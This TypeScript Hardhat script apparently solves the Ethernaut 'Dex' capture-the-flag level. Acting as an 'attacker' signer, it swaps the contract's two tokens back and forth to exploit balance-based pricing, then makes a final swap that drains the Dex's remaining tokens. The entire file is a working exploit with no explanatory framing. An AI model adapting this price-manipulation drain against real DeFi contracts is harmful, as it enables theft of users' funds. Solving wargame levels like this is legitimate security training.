// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { BigNumber } from "ethers";
import { parseEther } from "ethers/lib/utils";
import { ethers } from "hardhat";

async function main() {
  const dex = await ethers.getContractAt("Dex", "0xFA1401f57E5E51edBEfBF24526a45Bf1F8263D95")
  const firstTokenAddress = await dex.token1()
  const secondTokenAddress = await dex.token2()
  const firstToken = await ethers.getContractAt("SwappableToken", firstTokenAddress)
  const secondToken = await ethers.getContractAt("SwappableToken", secondTokenAddress)
  const [attacker] = await ethers.getSigners()

  const checkBalance = async (address: string): Promise<BigNumber[]> => {
    const firstTokenBalance = await firstToken.balanceOf(address)
    const secondTokenBalance = await secondToken.balanceOf(address)
    console.log(firstTokenBalance, secondTokenBalance)
    return [firstTokenBalance, secondTokenBalance]
  }

  // approve very large number
  const tokenApproval = await dex.connect(attacker).approve(dex.address, parseEther("1"))
  await tokenApproval.wait(4)

  for (let i = 0; i < 5; i++) {
    if (i % 2 == 0) {
      const swap = await dex.connect(attacker).swap(firstToken.address, secondToken.address, (await checkBalance(attacker.address))[0])
      await swap.wait(4)
    } else {
      const swap = await dex.connect(attacker).swap(secondToken.address, firstToken.address, (await checkBalance(attacker.address))[1])
      await swap.wait(4)
    }
  }
  // swap leftover
  const swap = await dex.connect(attacker).swap(secondToken.address, firstToken.address, (await checkBalance(dex.address))[1])
  await swap.wait(4)

  console.log("\n")
  await checkBalance(attacker.address)
  await checkBalance(dex.address)

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
